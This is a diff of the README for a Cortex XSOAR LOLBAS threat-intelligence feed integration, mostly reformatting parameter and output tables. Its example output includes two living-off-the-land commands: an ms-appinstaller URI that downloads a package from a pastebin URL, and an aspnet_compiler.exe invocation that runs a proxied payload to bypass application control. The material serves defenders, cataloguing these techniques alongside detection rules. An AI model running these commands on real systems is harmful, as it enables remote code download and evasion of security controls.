@@ -1,10 +1,5 @@
-Living off the land binaries" is a term used to describe malware or hacking techniques that take advantage of legitimate
-tools and processes that are already present on a computer or network, rather than introducing new malware or malicious
-code. The goal is to blend in with normal activity and avoid detection. Examples of this include using built-in Windows
-commands to move laterally through a network, or using scripting languages that are commonly installed on a system to
-execute malicious code. LOLBAS project is documenting binaries, scripts, and libraries that can be used for Living Off
-The Land techniques.
-This integration was integrated and tested with version v1 of LOLBAS.
+Living off the land binaries" is a term used to describe malware or hacking techniques that take advantage of legitimate tools and processes that are already present on a computer or network, rather than introducing new malware or malicious code. The goal is to blend in with normal activity and avoid detection. Examples of this include using built-in Windows commands to move laterally through a network, or using scripting languages that are commonly installed on a system to execute malicious code. LOLBAS project is documenting binaries, scripts, and libraries that can be used for Living Off The Land techniques.
+This integration was integrated and tested with version xx of LOLBAS Feed
 
 ## Configure LOLBAS Feed on Cortex XSOAR
 
@@ -12,19 +7,19 @@ This integration was integrated and tested with version v1 of LOLBAS.
 2. Search for LOLBAS Feed.
 3. Click **Add instance** to create and configure a new integration instance.
 
-   | **Parameter**                      | **Description**                                                                                                                                                                                        | **Required** |
-          |--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------| --- | --- |
-   | Fetch indicators                   |                                                                                                                                                                                                        | False |
-   | Indicator Reputation               | Indicators from this integration instance will be marked with this reputation.                                                                                                                         | False |
-   | Source Reliability                 | Reliability of the source providing the intelligence data.                                                                                                                                             | True |
-   | Traffic Light Protocol Color       | The Traffic Light Protocol \(TLP\) designation to apply to indicators fetched from the feed.                                                                                                           | False |
-   | Indicator Expiration Method        | The feed's expiration policy.                                                                                                                                                                          | False |
-   | Feed Fetch Interval                | The interval after which the feed expires.                                                                                                                                                             | False |
-   | Bypass exclusion list              | When selected, the exclusion list is ignored for indicators from this feed. This means that if an indicator from this feed is on the exclusion list, the indicator might still be added to the system. | False |
-   | Use system proxy settings          | Whether to use the system proxy settings.                                                                                                                                                              | False |
-   | Trust any certificate (not secure) | Whether to trust any certificate (not secure).                                                                                                                                                         | False |
-   | Tags                               | Comma-separated list of tags to filter the indicators by.                                                                                                                                              | False |
-   | Create relationships               | Create relationships between indicators as part of Enrichment.                                                                                                                                         | False |
+    | **Parameter** | **Description** | **Required** |
+    | --- | --- | --- |
+    | Base URL |  | True |
+    | Fetch indicators |  | False |
+    | Indicator Reputation | Indicators from this integration instance will be marked with this reputation | False |
+    | Source Reliability | Reliability of the source providing the intelligence data. | True |
+    | Traffic Light Protocol Color | The Traffic Light Protocol \(TLP\) designation to apply to indicators fetched from the feed. | False |
+    | Bypass exclusion list | When selected, the exclusion list is ignored for indicators from this feed. This means that if an indicator from this feed is on the exclusion list, the indicator might still be added to the system. | False |
+    | Use system proxy settings |  | False |
+    | Trust any certificate (not secure) |  | False |
+    | Tags | Supports CSV values. | False |
+    | Create relationships |  | False |
+    | Feed Fetch Interval |  | False |
 
 4. Click **Test** to validate the URLs, token, and connection.
 
@@ -44,108 +39,104 @@ Retrieves a limited number of indicators.
 
 #### Input
 
-| **Argument Name** | **Description**                             | **Required** |
-|-------------------|---------------------------------------------|--------------|
-| limit             | The maximum number of indicators to return. | Required     | 
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| limit | The maximum number of indicators to return. | Required | 
 
 #### Context Output
 
-| **Path**                                   | **Type** | **Description**                             |
-|--------------------------------------------|----------|---------------------------------------------|
-| LOLBAS.Indicators.Commands.category        | String   | The category of the command.                | 
-| LOLBAS.Indicators.Commands.command         | String   | The command.                                | 
-| LOLBAS.Indicators.Commands.description     | String   | The description of the command.             | 
-| LOLBAS.Indicators.Commands.mitreid         | String   | The MITRE ID related to the command.        | 
-| LOLBAS.Indicators.Commands.operatingsystem | String   | The operating system the command ran on.    | 
-| LOLBAS.Indicators.Commands.privileges      | String   | The privileges required to run the command. | 
-| LOLBAS.Indicators.Commands.usecase         | String   | The use case of the command.                | 
-| LOLBAS.Indicators.Description              | String   | The description of the indicator.           | 
-| LOLBAS.Indicators.Detections.content       | String   | The content of the detection.               | 
-| LOLBAS.Indicators.Detections.type          | String   | The type of the detection.                  | 
-| LOLBAS.Indicators.Name                     | String   | The name of the indicator.                  | 
-| LOLBAS.Indicators.Paths.path               | String   | The path of the indicator.                  | 
-| LOLBAS.Indicators.Type                     | String   | The type of the indicator.                  | 
+| **Path** | **Type** | **Description** |
+| --- | --- | --- |
+| LOLBAS.Indicators.Commands.category | String | The category of the command. | 
+| LOLBAS.Indicators.Commands.command | String | The command. | 
+| LOLBAS.Indicators.Commands.description | String | The description of the command. | 
+| LOLBAS.Indicators.Commands.mitreid | String | The MITRE ID related to the command. | 
+| LOLBAS.Indicators.Commands.operatingsystem | String | The operating system the command ran on. | 
+| LOLBAS.Indicators.Commands.privileges | String | The privileges required to run the command. | 
+| LOLBAS.Indicators.Commands.usecase | String | The use case of the command. | 
+| LOLBAS.Indicators.Description | String | The description of the indicator. | 
+| LOLBAS.Indicators.Detections.content | String | The content of the detection. | 
+| LOLBAS.Indicators.Detections.type | String | The type of the detection. | 
+| LOLBAS.Indicators.Name | String | The name of the indicator. | 
+| LOLBAS.Indicators.Paths.path | String | The path of the indicator. | 
+| LOLBAS.Indicators.Type | String | The type of the indicator. | 
 
 #### Command example
-
 ```!lolbas-get-indicators limit=2```
-
 #### Context Example
-
 ```json
 {
-  "LOLBAS": {
-    "Indicators": [
-      {
-        "Commands": [
-          {
-            "category": "Download",
-            "command": "start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw",
-            "description": "AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in C:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\AC\\INetCache\\<RANDOM-8-CHAR-DIRECTORY>",
-            "mitreid": "T1105",
-            "operatingsystem": "Windows 10, Windows 11",
-            "privileges": "User",
-            "usecase": "Download file from Internet"
-          }
-        ],
-        "Description": "Tool used for installation of AppX/MSIX applications on Windows 10",
-        "Detections": [
-          {
-            "content": "https://github.com/SigmaHQ/sigma/blob/bdb00f403fd8ede0daa04449ad913200af9466ff/rules/windows/dns_query/win_dq_lobas_appinstaller.yml",
-            "type": "Sigma"
-          }
-        ],
-        "Name": "AppInstaller.exe",
-        "Paths": [
-          {
-            "path": "C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\\AppInstaller.exe"
-          }
-        ],
-        "Type": "Tool"
-      },
-      {
-        "Commands": [
-          {
-            "category": "AWL Bypass",
-            "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe -v none -p C:\\users\\cpl.internal\\desktop\\asptest\\ -f C:\\users\\cpl.internal\\desktop\\asptest\\none -u",
-            "description": "Execute C# code with the Build Provider and proper folder structure in place.",
-            "mitreid": "T1127",
-            "operatingsystem": "Windows 10, Windows 11",
-            "privileges": "User",
-            "usecase": "Execute proxied payload with Microsoft signed binary to bypass application control solutions"
-          }
-        ],
-        "Description": "ASP.NET Compilation Tool",
-        "Detections": [
-          {
-            "content": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules",
-            "type": "BlockRule"
-          },
-          {
-            "content": "https://github.com/SigmaHQ/sigma/blob/960a03eaf480926ed8db464477335a713e9e6630/rules/windows/process_creation/win_pc_lobas_aspnet_compiler.yml",
-            "type": "Sigma"
-          }
-        ],
-        "Name": "Aspnet_Compiler.exe",
-        "Paths": [
-          {
-            "path": "c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe"
-          },
-          {
-            "path": "c:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe"
-          }
-        ],
-        "Type": "Tool"
-      }
-    ]
-  }
+    "LOLBAS": {
+        "Indicators": [
+            {
+                "Commands": [
+                    {
+                        "category": "Download",
+                        "command": "start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw",
+                        "description": "AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in C:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\AC\\INetCache\\<RANDOM-8-CHAR-DIRECTORY>",
+                        "mitreid": "Ingress Tool Transfer",
+                        "operatingsystem": "Windows 10, Windows 11",
+                        "privileges": "User",
+                        "usecase": "Download file from Internet"
+                    }
+                ],
+                "Description": "Tool used for installation of AppX/MSIX applications on Windows 10",
+                "Detections": [
+                    {
+                        "content": "https://github.com/SigmaHQ/sigma/blob/bdb00f403fd8ede0daa04449ad913200af9466ff/rules/windows/dns_query/win_dq_lobas_appinstaller.yml",
+                        "type": "Sigma"
+                    }
+                ],
+                "Name": "AppInstaller.exe",
+                "Paths": [
+                    {
+                        "path": "C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\\AppInstaller.exe"
+                    }
+                ],
+                "Type": "Tool"
+            },
+            {
+                "Commands": [
+                    {
+                        "category": "AWL Bypass",
+                        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe -v none -p C:\\users\\cpl.internal\\desktop\\asptest\\ -f C:\\users\\cpl.internal\\desktop\\asptest\\none -u",
+                        "description": "Execute C# code with the Build Provider and proper folder structure in place.",
+                        "mitreid": "Trusted Developer Utilities Proxy Execution",
+                        "operatingsystem": "Windows 10, Windows 11",
+                        "privileges": "User",
+                        "usecase": "Execute proxied payload with Microsoft signed binary to bypass application control solutions"
+                    }
+                ],
+                "Description": "ASP.NET Compilation Tool",
+                "Detections": [
+                    {
+                        "content": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules",
+                        "type": "BlockRule"
+                    },
+                    {
+                        "content": "https://github.com/SigmaHQ/sigma/blob/960a03eaf480926ed8db464477335a713e9e6630/rules/windows/process_creation/win_pc_lobas_aspnet_compiler.yml",
+                        "type": "Sigma"
+                    }
+                ],
+                "Name": "Aspnet_Compiler.exe",
+                "Paths": [
+                    {
+                        "path": "c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe"
+                    },
+                    {
+                        "path": "c:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe"
+                    }
+                ],
+                "Type": "Tool"
+            }
+        ]
+    }
 }
 ```
 
 #### Human Readable Output
 
-> ### LOLBAS indicators
-
+>### LOLBAS indicators
 >|Name|Description|
 >|---|---|
 >| AppInstaller.exe | Tool used for installation of AppX/MSIX applications on Windows 10 |
